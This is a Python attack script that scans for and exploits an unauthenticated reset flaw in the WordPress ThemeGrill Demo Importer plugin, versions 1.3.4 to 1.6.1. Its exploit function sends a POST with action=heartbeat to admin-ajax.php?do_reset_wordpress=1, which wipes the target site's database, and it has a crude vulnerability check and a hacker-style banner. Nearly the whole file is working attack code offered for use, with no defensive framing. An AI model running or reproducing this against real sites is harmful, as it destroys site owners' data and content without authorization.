# Scan and Exploit
# @UnknownHimash
# WordPres ThemeGrill Demo Importer 1.3.4 - 1.6.1
# Auth_Bypass

import requests
import time
import json
import argparse

print('                                   ')
print("""         |||||||  |     |  |||||||| |    |
         |     |  |     |     ||    |    |
         |||||||  |     |     ||    ||||||
         |     |  |     |     ||    |    | 
         |     |  |||||||     ||    |    | 

         __________________________________
         Bypass WordPress ThemeGrill Plugin
         ----------------------------------
         @UnknownHimash

         Type -h for the help
         """)
def main(arguments):

    if arguments.E:
        exploit()

    if arguments.s:
        scan()

def scan():
    headers = {"User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.47 Safari/537.36",
           "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
           "Connection": "keep-alive",
           "Content-Type": "application/x-www-form-urlencoded",
           "Connection": "keep-alive"
           }
    url = "http://127.0.0.1/wp-content/plugins/themegrill-demo-importer/includes/class-demo-importer.php"
    print (" Scanning the Target.......! ")
    scan_response = requests.get(url)

    if scan_response.status_code == 200:
        print(" Target is Vulnerable ...!")

    else:
        print(" Target is not Vulnerable")
              
              
def exploit():
    
    data = {"action":"heartbeat"}
    headers = {"User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.47 Safari/537.36",
           "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
           "Connection": "keep-alive",
           "Content-Type": "application/x-www-form-urlencoded",
           "Connection": "keep-alive"
           }
    url = "http://127.0.0.1/wp-admin/admin-ajax.php?do_reset_wordpress=1"
    print ("   Exploiting the Target .........  ")
    response = requests.post(url, data, headers=headers)

    if response.status_code == 200:
        print("   Target Exploited .....!")

    else:
        print(" Target is not Exploitable .... !")
        
if __name__ == "__main__":

    description = 'ThemeGrill Wordpress Plugin Vulnerability Scan & Exploit'
    
    parser = argparse.ArgumentParser(description=description)

    parser.add_argument("-s", help= " To Scan the Target Type -s ")
    parser.add_argument("-E", help= "To Exploit the Target Type -E")
    arguments = parser.parse_args()
    main(arguments)
